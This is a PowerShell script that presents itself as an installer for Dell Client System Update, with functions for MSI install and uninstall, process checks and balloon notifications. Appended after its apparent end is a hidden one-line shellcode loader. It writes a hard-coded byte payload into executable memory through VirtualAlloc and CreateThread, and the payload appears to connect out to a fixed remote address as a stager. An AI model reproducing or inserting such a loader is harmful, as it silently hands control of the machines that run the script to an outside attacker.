 
 
 
 
 
 

 Clear-Host  
 
 Set-Variable -Name OS -Scope Global -Force  
 Set-Variable -Name RelativePath -Scope Global -Force  
 Function RenameWindow ($Title) {  
      
      Set-Variable -Name a -Scope Local -Force  
      $a = (Get-Host).UI.RawUI  
      $a.WindowTitle = $Title  
      
      Remove-Variable -Name a -Scope Local -Force  
 }  
 Function GetRelativePath {  
      $Global:RelativePath=(split-path $SCRIPT:MyInvocation.MyCommand.Path -parent)+"\"  
 }  
 Function GetOSArchitecture {  
      $Global:Architecture = Get-WMIObject win32_operatingsystem  
      $Global:Architecture = $Global:Architecture.OSArchitecture  
      
 }  
 Function ProcessRunning($Description,$Process) {  
      
      Set-Variable -Name ProcessActive -Scope Local -Force  
      Write-Host $Description"....." -NoNewline  
      $ProcessActive = Get-Process $Process -ErrorAction SilentlyContinue  
      if($ProcessActive -eq $null) {  
           Write-Host "Not Running" -ForegroundColor Yellow  
      } else {  
           Write-Host "Running" -ForegroundColor Red  
      }  
      
      Remove-Variable -Name ProcessActive -Scope Local -Force  
 }  
 Function KillProcess($Description,$Process) {  
      
      Set-Variable -Name ProcessActive -Scope Local -Force  
      Write-Host $Description"....." -NoNewline  
      $ProcessActive = Stop-Process -Name $Process -Force  
      If ($ProcessActive -eq $null) {  
           Write-Host "Killed" -ForegroundColor Yellow  
      } else {  
           Write-Host "Still Running" -ForegroundColor Red  
      }  
 }  
 Function CopyFile($FileName,$SourceDir,$DestinationDir,$NewFileName) {  
      If ($SourceDir.SubString($SourceDir.length-1) -ne "\") {  
           $SourceDir = $SourceDir+"\"  
      }  
      If ((Test-Path -Path $SourceDir$FileName) -eq $true) {  
           Write-Host "Copying"$FileName"....."  
           Copy-Item -Path $SourceDir$FileName -Destination $DestinationDir -Force  
           If ($NewFileName -ne "") {  
                If ($DestinationDir.SubString($DestinationDir.length-1) -ne "\") {  
                     $DestinationDir = $DestinationDir+"\"  
                }  
                Rename-Item -Path $DestinationDir$FileName -NewName $NewFileName -Force  
           }  
      }  
 }  
 Function BalloonTip($ApplicationName, $Status, $DisplayTime) {  
      
      Set-Variable -Name balloon -Scope Local -Force  
      Set-Variable -Name icon -Scope Local -Force  
      Set-Variable -Name path -Scope Local -Force  
      [system.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null  
      $balloon = New-Object System.Windows.Forms.NotifyIcon  
      $path = Get-Process -id $pid | Select-Object -ExpandProperty Path  
      $icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)  
      $balloon.Icon = $icon  
      $balloon.BalloonTipIcon = 'Info'  
      $balloon.BalloonTipTitle = "Gresham, Smith and Partners"  
      $balloon.BalloonTipText = $ApplicationName+[char]13+[char]13+$Status  
      $balloon.Visible = $true  
      $balloon.ShowBalloonTip($DisplayTime)  
      
      Remove-Variable -Name balloon -Scope Local -Force  
      Remove-Variable -Name icon -Scope Local -Force  
      Remove-Variable -Name path -Scope Local -Force  
 }  
 Function UninstallOldMSIApplication($Description) {  
      
      Set-Variable -Name AppName -Scope Local -Force  
      Set-Variable -Name Arguments -Scope Local -Force  
      Set-Variable -Name Desc -Scope Local -Force  
      Set-Variable -Name ErrCode -Scope Local -Force  
      Set-Variable -Name GUID -Scope Local -Force  
      Set-Variable -Name Output -Scope Local -Force  
      Set-Variable -Name Output1 -Scope Local -Force  
      
      $Desc = [char]34+"description like"+[char]32+[char]39+[char]37+$Description+[char]37+[char]39+[char]34  
      $Output1 = wmic product where $Desc get Description  
      cls  
      $Output1 | ForEach-Object {  
           $_ = $_.Trim()  
        if(($_ -ne "Description")-and($_ -ne "")){  
          $AppName = $_  
        }  
      }  
      If ($AppName -eq $null) {  
           return  
      }  
      Write-Host "Uninstalling"$AppName"....." -NoNewline  
      $Output = wmic product where $Desc get IdentifyingNumber  
      $Output | ForEach-Object {  
           $_ = $_.Trim()  
             if(($_ -ne "IdentifyingNumber")-and($_ -ne "")){  
               $GUID = $_  
             }  
      }  
      $Arguments = "/X"+[char]32+$GUID+[char]32+"/qb- /norestart"  
      $ErrCode = (Start-Process -FilePath "msiexec.exe" -ArgumentList $Arguments -Wait -Passthru).ExitCode  
      $Result = (AppInstalled $Description)  
      If ($Result) {  
           Write-Host "Failed with error code"$ErrCode -ForegroundColor Red  
      } else {  
           Write-Host "Uninstalled" -ForegroundColor Yellow  
      }  
      
      Remove-Variable -Name AppName -Scope Local -Force  
      Remove-Variable -Name Arguments -Scope Local -Force  
      Remove-Variable -Name Desc -Scope Local -Force  
      Remove-Variable -Name ErrCode -Scope Local -Force  
      Remove-Variable -Name GUID -Scope Local -Force  
      Remove-Variable -Name Output -Scope Local -Force  
      Remove-Variable -Name Output1 -Scope Local -Force  
 }  
 Function InstallMSIApplication($App,$Switches,$Transforms,$Desc) {  
      
      Set-Variable -Name App -Scope Local -Force  
      Set-Variable -Name Arguments -Scope Local -Force  
      Set-Variable -Name ErrCode -Scope Local -Force  
      Set-Variable -Name Result -Scope Local -Force  
      Write-Host "Installing"$Desc"....." -NoNewline  
      $App = [char]32+[char]34+$RelativePath+$App+[char]34  
      $Switches = [char]32+$Switches  
      If ($Transforms -ne $null) {  
           $Transforms = [char]32+"TRANSFORMS="+$RelativePath+$Transforms  
           $Arguments = "/I"+$App+$Transforms+$Switches  
      } else {  
           $Arguments = "/I"+$App+$Switches  
      }  
      $ErrCode = (Start-Process -FilePath "msiexec.exe" -ArgumentList $Arguments -Wait -Passthru).ExitCode  
      $Result = (AppInstalled $Desc)  
      If ($Result) {  
           Write-Host "Installed" -ForegroundColor Yellow  
      } else {  
           Write-Host "Failed with error"$ErrCode -ForegroundColor Red  
      }  
      
      Remove-Variable -Name App -Scope Local -Force  
      Remove-Variable -Name Arguments -Scope Local -Force  
      Remove-Variable -Name ErrCode -Scope Local -Force  
      Remove-Variable -Name Result -Scope Local -Force  
 }  
 Function InstallEXEApplication($App,$Switches,$Desc) {  
      
      Set-Variable -Name ErrCode -Scope Local -Force  
      Set-Variable -Name Result -Scope Local -Force  
      Write-Host "Installing <Application>....." -NoNewline  
      $App = [char]32+[char]34+$RelativePath+$App+[char]34  
      $ErrCode = (Start-Process -FilePath $App -ArgumentList $Switches -Wait -Passthru).ExitCode  
      $Result = (AppInstalled $Desc)  
      If ($Result) {  
           Write-Host "Installed" -ForegroundColor Yellow  
      } else {  
           Write-Host "Failed with error"$ErrCode -ForegroundColor Red  
      }  
      
      Remove-Variable -Name ErrCode -Scope Local -Force  
      Remove-Variable -Name Result -Scope Local -Force  
 }  
 Function AppInstalled($Description) {  
      
      Set-Variable -Name AppName -Scope Local -Force  
      Set-Variable -Name Output -Scope Local -Force  
      
      $Description = [char]34+"description like"+[char]32+[char]39+[char]37+$Description+[char]37+[char]39+[char]34  
      $Output = wmic product where $Description get Description  
      $Output | ForEach-Object {  
           $_ = $_.Trim()  
             if(($_ -ne "Description")-and($_ -ne "")){  
                $AppName = $_  
             }  
      }  
      If ($AppName -eq $null) {  
           return $false  
      } else {  
           return $true  
      }  
      
      Remove-Variable -Name AppName -Scope Local -Force  
      Remove-Variable -Name Output -Scope Local -Force  
 }  
 Function ExecuteDCSU($App,$Switches) {  
      
      Set-Variable -Name ErrCode -Scope Local -Force  
      $App = [char]34+"C:\Program Files (x86)\Dell\ClientSystemUpdate\"+$App+[char]34  
      $Switches = "/policy"+[char]32+$RelativePath+$Switches  
      $ErrCode = (Start-Process -FilePath $App -ArgumentList $Switches -Wait -Passthru).ExitCode  
      If ($ErrCode -eq 0) {  
           Write-Host "Drivers Updated" -ForegroundColor Yellow  
      } else {  
           Write-Host "Failed with error"$ErrCode -ForegroundColor Red  
      }  
      
      Remove-Variable -Name ErrCode -Scope Local -Force  
 }  
 RenameWindow "Install Dell Client System Update"  
 GetRelativePath  
 GetOSArchitecture  
 BalloonTip "Dell Client System Update" "Updating Drivers...." 10000  
 InstallMSIApplication "Dell Client System Update.msi" "/qb- /norestart" $null "Dell Client System Update"  
 ExecuteDCSU "dcsu-cli.exe" "BuildPolicy.xml"  
 UninstallOldMSIApplication "Dell Client System Update"  
 BalloonTip "Dell Client System Update" "Driver Update Complete" 30000  
 
 Remove-Variable -Name OS -Scope Global -Force  
 Remove-Variable -Name RelativePath -Scope Global -Force  

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xd5,0x39,0x2d,0x7d,0x68,0x02,0x00,0x01,0xbc,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

